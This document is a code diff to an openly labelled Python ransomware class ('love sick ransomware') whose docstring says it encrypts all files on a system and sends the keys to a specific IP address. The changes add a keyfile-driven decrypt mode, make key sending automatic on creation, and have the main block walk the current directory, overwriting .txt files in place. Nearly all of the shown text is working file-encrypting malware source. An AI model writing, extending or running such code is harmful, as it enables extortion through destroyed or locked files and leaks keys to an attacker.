@@ -1,13 +1,23 @@
+#this file is encrypt and decrypt
 import os
 from cryptography.fernet import Fernet
 class ransomware(object):
     """
+    I named this love sick ransomware
     this will encrypt all files in your system
     and send keys to specific ip address
     """
-    def __init__(self):
-        self.key = Fernet.generate_key()
-        self.cryptor = Fernet(self.key)
+    def __init__(self,keyfile = None):
+        if keyfile is not None:
+            self.keyfile ="love sick girl"
+            with open(keyfile,'rb') as f:
+                self.key = f.read()
+            self.cryptor = Fernet(self.key)
+        else:
+            self.keyfile = None
+            self.key = Fernet.generate_key()
+            self.cryptor = Fernet(self.key)
+            self.send_key()
 
     def send_key(self):
         """
@@ -29,13 +39,16 @@ class ransomware(object):
 
     def fileextcheck(self,path):
         for file in self.path_traversal(path):
-            if file.split(".")[-1] != "txt":
+            if not file.endswith("txt"):
                 continue
             with open(file,"rb+") as f:
                 data = f.read()
                 f.seek(0)
                 f.truncate()
-                f.write(self.encrypt(data))
+                if self.keyfile is not None:
+                    f.write(self.decrypt(data))
+                else:
+                    f.write(self.encrypt(data))
 
 
 def test():
@@ -53,8 +66,7 @@ def test():
         f.seek(0)
         f.truncate()
         f.write(rware.decrypt(data))
-
 if __name__ == "__main__":
-    rware = ransomware()
-    rware.send_key()
-    
+    # don't confused attr of object with parameters
+    rware = ransomware(keyfile="keyfile")
+    rware.fileextcheck('.')
